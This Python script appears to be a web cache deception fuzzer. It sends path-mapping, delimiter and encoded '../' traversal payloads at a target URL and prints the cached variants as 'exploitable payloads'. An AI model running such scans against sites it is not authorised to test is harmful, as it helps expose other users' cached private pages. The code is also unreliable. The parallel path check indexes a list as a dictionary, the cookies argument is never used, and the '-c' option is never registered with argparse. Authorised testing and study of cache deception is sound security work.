#!/usr/bin/env python3
import time
import sys
import re
import argparse
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin



class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

STATIC_DIRS = [
    "static",
    "assets",
    "resources",
    "res",
    "public",
    "content",
    "files",
    "media",
    "img",
    "images",
    "js",
    "css",
    "fonts",
    "scripts",
    "lib",
    "dist",
    "build",
    "_next",       # Next.js
    "wp-content",  # WordPress
    "wp-includes", # WordPress
    "vendor",
    "client",
    "themes",
    "uploads",
    "data",
]

DELIMITERS = [
    "!", '"', "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";",
    "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "`", "{", "|", "}", "~",
    "%21","%22","%23","%24","%25","%26","%27","%28","%29","%2A","%2B","%2C","%2D",
    "%2E","%2F","%3A","%3B","%3C","%3D","%3E","%3F","%40","%5B","%5C","%5D",
    "%5E","%5F","%60","%7B","%7C","%7D","%7E",
]

STATIC_EXTENSIONS = [
    ".js", ".css", ".png", ".jpg", ".jpeg", ".ico", ".svg", ".json"
]

def fetch(url, cookies=None):
    try:
        r = requests.get(url, cookies=cookies, timeout=7, allow_redirects=True)
        if r.status_code >= 500:
            print(f"{Colors.RED}[ERROR] Server returned {r.status_code}. Stopping.{Colors.RESET}")
            sys.exit(1)
        return r
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Request failed: {e}{Colors.RESET}")
        sys.exit(1)


def fetch_raw_headers(url, cookies=None):
    http = urllib3.PoolManager()
    resp = http.request("GET", url, redirect=False)
    return resp

def clean(resp_data):
    try:
        text = resp_data.decode("utf-8", errors="ignore")
    except:
        text = str(resp_data)

    text = re.sub(r"<script.*?</script>", "", text, flags=re.DOTALL)
    text = re.sub(r"value=['\"][A-Za-z0-9-_]{20,}['\"]", "", text)
    text = re.sub(r"\d{4}-\d{2}-\d{2}", "", text)
    text = re.sub(r"\d{10,13}", "", text)
    text = re.sub(r"[A-Za-z0-9]{32,}", "", text)

    return text.strip()

def responses_similar(base, modified):
    if base.status != modified.status:
        return False

    blen = len(base.data)
    mlen = len(modified.data)
    if abs(blen - mlen) > blen * 0.10:
        return False

    base_clean = clean(base.data)
    mod_clean = clean(modified.data)

    if base_clean[:200] == mod_clean[:200]:
        return True
    if base_clean[-200:] == mod_clean[-200:]:
        return True

    return False

def is_cached(headers):
    cache_indicators = [
        "X-Cache", "CF-Cache-Status", "Age", "X-Proxy-Cache"
    ]
    for key in cache_indicators:
        if key in headers:
            v = headers.get(key, "")
            if any(w in v.lower() for w in ["miss", "hit", "cached", "refresh", "revalidate", "stale"]):
                return True
    return False

def test_path_mapping_discrepancy(url, base_resp):
    print(f"{Colors.BLUE}{Colors.BOLD}\n[1] Detecting PATH MAPPING discrepancies...{Colors.RESET}")

    # Extract endpoint and parent paths
    endpoint = url.rstrip("/").split("/")[-1]

    # 1) Test PATH ABSTRACTION: /my-account/abc
    test_url_1 = f"{url.rstrip('/')}/abc"
    print(f"{Colors.BLUE}→ Testing origin path abstraction: {test_url_1}{Colors.RESET}")
    
    modified_resp_1 = fetch_raw_headers(test_url_1)

    if responses_similar(base_resp, modified_resp_1):
        print(f"{Colors.GREEN}      ✔ Origin abstracts /{endpoint}/abc → /{endpoint}{Colors.RESET}")
    else:
        print(f"{Colors.RED}        ✘ Origin DOES NOT abstract path. No mapping discrepancy here.{Colors.RESET}")
        return False

    # 2) Test CACHE BEHAVIOR with static extension: /my-account/abc.js
    modified_url_for_cache = f"{url.rstrip('/')}/abc.js"
    modified_resp_for_cache = fetch_raw_headers(modified_url_for_cache)

    print(f"{Colors.BLUE}→ Testing cache behavior for static extension: {modified_url_for_cache}{Colors.RESET}")

    cached_before = is_cached(modified_resp_for_cache.headers)

    if cached_before:
        print(f"{Colors.GREEN}      ✔ Response already cached on first request (rare but possible){Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}     ↳ Not cached yet (X-Cache: miss). Retesting...{Colors.RESET}")

    # 3) Re-request to confirm HIT
    resp3 = fetch_raw_headers(modified_url_for_cache)
    cached_after = is_cached(resp3.headers)

    if cached_after:
        print(f"{Colors.GREEN}✔ Cache rule detected for *.js extension !{Colors.RESET}")
        print(f"{Colors.CYAN}→ The cache interprets the path literally as /{endpoint}/abc.js{Colors.RESET}")
        print(f"{Colors.GREEN}→ PATH MAPPING DISCREPANCY CONFIRMED 🔥{Colors.RESET}")

        return {
            "success": True,
            "payload": modified_url_for_cache,
            "exploit_example": f"/{endpoint}/wcd.js"
        }

    else:
        print(f"{Colors.RED}✘ No cache hit after second request. {Colors.BOLD}No mapping discrepancy.{Colors.RESET}")
        return False

def test_one_mapping(url, ext, endpoint, base_resp, cookies=None):
    """
    Worker: test un seul type de payload en parallèle.
    """
    payloads = []

    parent = url.rstrip("/").rsplit("/", 1)[0]

    candidates = [
        f"{url.rstrip('/')}/abc{ext}",          # /endpoint/abc.js
        f"{parent}/{endpoint}{ext}",            # /endpoint.js
        f"{parent}/{endpoint}%2fabc{ext}",      # /endpoint%2fabc.js
    ]

    for test_url in candidates:
        modified_resp = fetch_raw_headers(test_url, cookies=cookies)
        cached = is_cached(modified_resp.headers)

        # On valide uniquement si le cache voit le fichier comme statique
        if cached:
            payloads.append(test_url)

    return payloads

def test_path_mapping_discrepancy_parallel(url, base_resp, cookies=None, max_threads=15):
    print(f"{Colors.BLUE}{Colors.BOLD}\n[1] Detecting PATH MAPPING discrepancies (Parallel)...{Colors.RESET}")

    endpoint = url.rstrip("/").split("/")[-1]

    # --- Test ORIGIN PATH ABSTRACTION ---
    print(f"{Colors.BLUE}→ Testing origin path abstraction...{Colors.RESET}")
    test_url_1 = f"{url.rstrip('/')}/abc"
    modified_resp_1 = fetch_raw_headers(test_url_1, cookies=cookies)

    if not responses_similar(base_resp, modified_resp_1):
        print(f"{Colors.RED}✘ Origin does NOT abstract path → No mapping discrepancy.{Colors.RESET}")
        return []

    print(f"{Colors.GREEN}✔ Origin abstracts /{endpoint}/abc → /{endpoint}{Colors.RESET}")

    # --- Parallel testing of static extensions ---
    print(f"{Colors.BLUE}→ Testing cache behavior on static extensions in parallel...{Colors.RESET}")

    found_payloads = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(
                test_one_mapping, url, ext, endpoint, base_resp, cookies
            ): ext for ext in STATIC_EXTENSIONS
        }

        for future in as_completed(futures):
            ext = futures[future]
            try:
                results = future.result()
                for payload in results:
                    print(f"{Colors.GREEN}  ✔ Cache HIT for {payload}{Colors.RESET}")
                    found_payloads.append(payload)

            except Exception as e:
                print(f"[ERR] Extension {ext}: {e}")

    if found_payloads:
        print(f"{Colors.GREEN}{Colors.BOLD}\n🔥 PATH MAPPING DISCREPANCY CONFIRMED!{Colors.RESET}")
        return found_payloads

    print(f"{Colors.RED}✘ No static extension produced a cache discrepancy.{Colors.RESET}")
    return []

def test_delimiters_discrepancy(url, base_resp):
    delim_hits = []
    cache_hits_url = []
    
    print(f"\n{Colors.BLUE}{Colors.BOLD}[2] Testing delimiters...{Colors.RESET}")
    
    for d in DELIMITERS:
        test_url = f"{url.rstrip('/')}{d}test.js"
        modified_resp = fetch_raw_headers(test_url)

        if not responses_similar(base_resp, modified_resp):
            continue
                
        cached = is_cached(modified_resp.headers)
      
        if cached:
            cache_hits_url.append(test_url)

        delim_hits.append(d)

    
    return delim_hits, cache_hits_url

def test_origin_normalization_discrepancy(url, base_resp, cookies=None):
    print(f"\n{Colors.BLUE}{Colors.BOLD}[3] Testing ORIGIN normalization{Colors.RESET}")

    normals = ["../", "..%2f", "%2e%2e%2f"]
    dirs_cache_found = []
    normals_found    = []

    endpoint = url.rstrip("/").split("/")[-1]
    parent = url.rstrip("/").rsplit("/", 1)[0]

    for n in normals:
        test_url = f"{parent}/aaa/{n}{endpoint}"
        modified_resp = fetch_raw_headers(test_url)
       
        if not responses_similar(base_resp, modified_resp):
            continue
        
        normals_found.append(n)

        print(f"{Colors.GREEN}[+] Origin NORMALIZATION detected with payload: {n}{Colors.RESET}")
        print(f"{Colors.CYAN}       → Origin rewrote {test_url} to /{endpoint}{Colors.RESET}")
        
        cached = is_cached(modified_resp.headers)

        if not cached:
            print(f"{Colors.RED}        ✘ But no cache found")
            print(f"{Colors.BLUE}       ⮡ Checking static dir for cache...{Colors.RESET}")
            
            for sd in STATIC_DIRS:
                test_url = f"{url.rsplit('/',1)[0]}/{sd}/{n}{endpoint}"
                modified_resp = fetch_raw_headers(test_url)
            
                cached = is_cached(modified_resp.headers)
                if cached:
                    print(f"{Colors.CYAN}{Colors.BOLD}      ✔ Cache found! Try this payload: {test_url}{Colors.RESET}")
                    dirs_cache_found.append(test_url)
            
            if not dirs_cache_found: 
                print(f"{Colors.RED}        → No static dir work{Colors.RESET}")


    return normals_found, dirs_cache_found

    # print(f"{Colors.RED}[-] No ORIGIN normalization.{Colors.RESET}")
    # return False

def test_cache_normalization_discrepancy(url, base_resp, delimiters, cookies=None):
    print(f"\n{Colors.BLUE}{Colors.BOLD}[4] Testing CACHE normalization discrepancy{Colors.RESET}")

    encoded_normals = [
        "%2f%2e%2e%2f",   # /../
        "%2F%2E%2E%2F",
        "%2f..%2f", 
        "%2f%2e%2e/",
        "%2f%2e/", 
    ]

    candidate_payloads = []
    exploitable = []
  

    endpoint = url.rstrip("/").split("/")[-1]
    parent = url.rstrip("/").rsplit("/", 1)[0]

    print(f"{Colors.CYAN}  ↳ Checking if cache resolves encoded dot-segments...{Colors.RESET}")

    for enc in encoded_normals:
        for d in delimiters:
            for sd in STATIC_DIRS:
                # Ex payload: /dynamic%encoded../static-dir
                test_url = f"{parent}/{endpoint}{d}{enc}{sd}?wcd"
                modified_resp = fetch_raw_headers(test_url, cookies=cookies)
              
                if not responses_similar(base_resp, modified_resp):
                    continue

                cached = is_cached(modified_resp.headers)
                if cached:
                    candidate_payloads.append(test_url)
             

    return candidate_payloads
          
def worker_test_cache_norm(url, enc, d, sd, base_resp, cookies=None):
    """
    Worker : teste UNE combinaison (enc, delimiter, static-dir)
    et renvoie l'URL exploitable ou None
    """
    endpoint = url.rstrip("/").split("/")[-1]
    parent = url.rstrip("/").rsplit("/", 1)[0]

    test_url = f"{parent}/{endpoint}{d}{enc}{sd}?wcd"
    modified_resp = fetch_raw_headers(test_url, cookies=cookies)

    # doit matcher la réponse dynamique → même comportement que base_resp
    if not responses_similar(base_resp, modified_resp):
        return None

    # mais doit être mis en cache
    if is_cached(modified_resp.headers):
        return test_url

    return None

def test_cache_normalization_discrepancy_parallel(
    url, base_resp, delimiters, cookies=None, max_threads=20
):
    print(f"\n{Colors.BLUE}{Colors.BOLD}[4] Testing CACHE normalization discrepancy (parallel){Colors.RESET}")

    encoded_normals = [
        "%2f%2e%2e%2f",
        "%2F%2E%2E%2F",
        "%2f..%2f",
        "%2f%2e%2e/",
        "%2f%2e/",
    ]

    print(f"{Colors.CYAN}  ↳ Checking if cache resolves encoded dot-segments...{Colors.RESET}")

    tasks = []
    candidate_payloads = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for enc in encoded_normals:
            for d in delimiters:
                for sd in STATIC_DIRS:
                    tasks.append(
                        executor.submit(
                            worker_test_cache_norm,
                            url, enc, d, sd, base_resp, cookies
                        )
                    )

        for future in as_completed(tasks):
            try:
                result = future.result()
                if result:
                    candidate_payloads.append(result)
            except Exception as e:
                print(f"{Colors.RED}[ERR] Worker failed: {e}{Colors.RESET}")

    return candidate_payloads


def test_web_cache_deception(target:str, not_aggressive=False, cookies:str=None):
    base_url = target.rstrip("/")
    base_resp = fetch_raw_headers(base_url)

    # Test 1: 
    if not_aggressive:
        path_mapping_result = test_path_mapping_discrepancy(base_url, base_resp)
    else:
        path_mapping_result = test_path_mapping_discrepancy_parallel(base_url, base_resp)

    
    if path_mapping_result and path_mapping_result['success']:
        return

    # Test 2
    delimiters_hits, cache_hits_url = test_delimiters_discrepancy(target, base_resp)

    if delimiters_hits and cache_hits_url:
        print(Colors.GREEN + f"     ✓ Delimiter match and cache found!{Colors.RESET}")
        for c in cache_hits_url:
            print(Colors.CYAN + "     -> Try this payload: ", c, Colors.RESET)
        return
        
    print(Colors.YELLOW +   f"  ✓ Delimiter match: {{{', '.join(delimiters_hits)}}}{Colors.RESET}")
    print(Colors.RED +      "   ✘ But no cache found" + Colors.RESET)

    # Test 3
    origin_normal_payloads, dirs_cache_found = test_origin_normalization_discrepancy(target, base_resp)

    if origin_normal_payloads and dirs_cache_found:
        return

    # Test 4
    if delimiters_hits:
        if not_aggressive:
            cache_normal_payloads = test_cache_normalization_discrepancy(target, base_resp, delimiters_hits)

        else:
            cache_normal_payloads = test_cache_normalization_discrepancy_parallel(target, base_resp, delimiters_hits)
        
        if cache_normal_payloads:
            print(f"{Colors.GREEN}  ✓ Exploitable cache discrepancy paths found!{Colors.RESET}")
            print(f"{Colors.BLUE}  ↳ Found {len(cache_normal_payloads)} exploitable payloads:{Colors.RESET}")
            for cnp in cache_normal_payloads:
                print(f"{Colors.CYAN}      → {cnp}{Colors.RESET}")
        else:
            print(f"{Colors.RED}    ✘ No cache normalization discrepancy found{Colors.RESET}")
  
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Minimal Path Mapping Discrepancy Fuzzer (Burp-free)")
    parser.add_argument( "-t", "--target", required=True, help="Target base URL, e.g. http://example.com/item/123")
    parser.add_argument( "-s", "--slow", action='store_true', help="No parallelization, not aggressive")
    
    args = parser.parse_args()

    target = args.target
    cookies = None

    if "-c" in sys.argv:
        idx = sys.argv.index("-c")
        cookies = dict([sys.argv[idx+1].split("=", 1)])

    start = time.perf_counter()

    test_web_cache_deception(target, args.slow)
    
    end = time.perf_counter()
    elapsed_sec = end - start
    elapsed_min = elapsed_sec / 60

    print(f"\n{Colors.BLUE}Test Execution time: {elapsed_min:.2f} min ({elapsed_sec:.2f} sec)\n")
        
